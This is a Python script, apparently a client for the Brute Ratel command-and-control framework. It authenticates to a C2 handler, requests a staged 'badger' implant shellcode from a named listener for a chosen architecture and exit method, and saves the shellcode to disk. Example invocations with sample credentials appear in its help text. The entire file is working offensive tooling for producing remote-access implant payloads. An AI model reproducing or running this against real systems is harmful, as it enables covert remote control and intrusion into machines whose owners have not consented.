import argparse
import asyncio
import bruteratel

async def main():
    parser = argparse.ArgumentParser(
        description="Build a staged badger shellcode from a listener for a specific configuration",
        epilog="Example:\n" \
        " python3 api_build_stage.py -user ninja -password pass@123 -handler 172.16.219.1:8443 -listener primary-c2 -arch x64 -method rtl\n" \
        " python3 api_build_stage.py -user ninja -password pass@123 -handler 172.16.219.1:8443 -listener primary-c2 -arch x86 -method rtl\n" \
        " python3 api_build_stage.py -user ninja -password pass@123 -handler 172.16.219.1:8443 -listener primary-c2 -arch x64 -method wait\n" \
        " python3 api_build_stage.py -user ninja -password pass@123 -handler 172.16.219.1:8443 -listener primary-c2 -arch x86 -method wait",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-user',     type=str, required=True, help="api server username", metavar='')
    parser.add_argument('-password', type=str, required=True, help="api server password", metavar='')
    parser.add_argument('-handler',  type=str, required=True, help="api server handler host and port. Eg: 127.0.0.1:8443", metavar='')
    parser.add_argument('-listener', type=str, required=True, help="listener name to enable staging on", metavar='')
    parser.add_argument('-arch',     type=str, required=True, help="Badger architecture. Eg.: x86/x64", metavar='')
    parser.add_argument('-method',   type=str, required=True, help="Badger's exit-method: rtl, wait", metavar='')
    args = parser.parse_args()

    wsClient = await bruteratel.br_connect_handler(args.user, args.password, args.handler)
    print("[+] Authentication success")

    shellcode = await bruteratel.br_build_stage(wsClient, args.listener, args.arch, args.method)
    if shellcode is not None:
        shellcodeLen = len(shellcode)
        print(f"[+] Received shellcode of {shellcodeLen} bytes")
        fileIO = open(bruteratel.g_STAGER_OUTPUT_NAME, "wb")
        bytesWritten = fileIO.write(shellcode)
        fileIO.close()
        print("[+] Wrote %d bytes to disk" % bytesWritten)
    else:
        print("[-] Error building stager")

    await wsClient.close(1000)

if __name__ == "__main__":
    asyncio.run(main())
